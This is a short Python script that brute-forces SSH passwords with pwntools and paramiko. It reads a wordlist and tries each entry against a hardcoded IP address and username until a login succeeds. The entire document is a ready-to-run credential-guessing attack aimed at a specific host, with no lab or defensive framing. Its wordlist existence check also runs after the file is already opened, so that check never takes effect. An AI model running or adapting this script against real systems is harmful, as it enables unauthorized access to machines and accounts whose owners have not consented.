from pwn import *
import paramiko


def bruteforce():
    try:
        file_name = 'ssh_bruteforce/dict.txt'
        list_password = open(file_name, 'r', encoding='UTF-8').readlines()
        if not os.path.isfile(file_name):
            exit(f'[-] Wordlist not found!')
        host_name = '54.251.17.75'
        user_name = 'hauhppse14'
        print(f'\n[*] Trying connect to: {user_name}@{host_name}\n\n')
        for password in list_password:
            index = list_password.index(password)
            password = password.rstrip('\n')
            try:
                print(f'[{index}] Trying with password: "{password}"')
                respond = ssh(host=host_name, user=user_name, password=password)
                if respond.connected():
                    print('   > End process!')
                    respond.close()
                    break
                respond.close()
            except paramiko.ssh_exception.AuthenticationException:
                print()
                pass
                
    except KeyboardInterrupt:
        exit(0)
bruteforce()